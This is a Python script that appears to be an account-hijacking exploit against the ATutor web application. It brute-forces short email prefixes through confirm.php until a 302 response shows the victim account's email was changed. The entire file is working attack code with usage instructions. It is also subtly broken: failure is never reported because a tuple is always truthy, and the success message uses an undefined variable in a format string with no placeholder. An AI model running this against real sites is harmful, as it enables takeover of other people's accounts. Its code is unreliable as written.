import hashlib, string, itertools, re, sys, requests

def mailUpdate(ip, domain, id, prefixLen):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(prefixLen))):
        email = "%s@%s" % (word, domain)
        url = "http://%s/confirm.php?e=%s&m=0&id=%s" % (ip, email, id)
        print("[+] Attempting to update e-mail address with: %s" % email, end="\r", flush=True)
        r = requests.get(url, allow_redirects=False)
        if(r.status_code == 302):
            return (True, email, count)
        else:
            count += 1
    return (False, '', count)

def main():
    if len(sys.argv) != 5:
        print("[!] Usage: python3 %s <domain> <id> <prefixLen> <ip>" % sys.argv[0])
        print("[!] ex: python3 %s atutor.local 1 3 192.168.0.4\n" % sys.argv[0])
        sys.exit(-1)

    domain = sys.argv[1]
    id = sys.argv[2]
    prefixLen = sys.argv[3]
    ip = sys.argv[4]

    result = mailUpdate(ip, domain, id, prefixLen)
    if(result):
        print("\n[+] Account successfully hijacked!")
        print("[+] E-mail address: " % email)
    else:
        print("\n[!] Account hijacking failed.")

if __name__ == "__main__":
    main()
